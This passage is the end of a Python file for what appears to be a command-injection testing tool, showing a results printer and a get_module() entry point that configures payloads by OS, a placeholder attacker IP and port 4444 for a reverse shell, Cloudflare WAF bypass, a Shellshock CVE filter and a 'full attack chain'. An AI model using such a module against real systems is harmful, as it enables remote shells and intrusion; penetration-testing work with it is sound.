        print(f"    Passed  : {len(r['passed'])}")
        print(f"    Failed  : {len(r['failed'])}")
        if r["passed"]:
            print("    [+] Confirmed:")
            for p in r["passed"]: print(f"        {p}")
        if r["failed"]:
            print("    [-] Not triggered:")
            for p in r["failed"]: print(f"        {p}")
        print()


# ══════════════════════════════════════════════════════════════
#  ENTRY POINT FOR Main.py  (Syed Shaiq)
# ══════════════════════════════════════════════════════════════

def get_module(
    target_os:      str = "all",
    custom_command: str = None,
    attacker_ip:    str = "ATTACKER_IP",
    attacker_port:  int = 4444,
    min_severity:   str = "Low",
    min_confidence: int = 0,
    waf_target:     str = None,
) -> CommandInjectionModule:
    """
    Entry point called by CLI/Main.py

    Examples:
        # All payloads
        ci = get_module()

        # Only high-confidence unix payloads
        ci = get_module(target_os="unix", min_confidence=80)

        # Only payloads that bypass Cloudflare
        ci = get_module(waf_target="Cloudflare")

        # With reverse shell configured
        ci = get_module(attacker_ip="192.168.1.10", attacker_port=4444)

        # Payloads for a specific CVE
        ci.filter_by_cve("CVE-2014-6271")

        # Full attack chain
        ci.get_chain("unix_basic")
    """
    return CommandInjectionModule(
        target_os=target_os,
        custom_command=custom_command,
        attacker_ip=attacker_ip,
        attacker_port=attacker_port,
        min_severity=min_severity,
        min_confidence=min_confidence,
        waf_target=waf_target,
    )
